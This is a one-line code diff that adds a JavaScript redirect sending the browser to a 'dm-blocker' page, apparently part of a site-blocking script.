@@ -1,0 +1,1 @@
+window.location = 'http://dm-blocker.100yen.co.uk/';
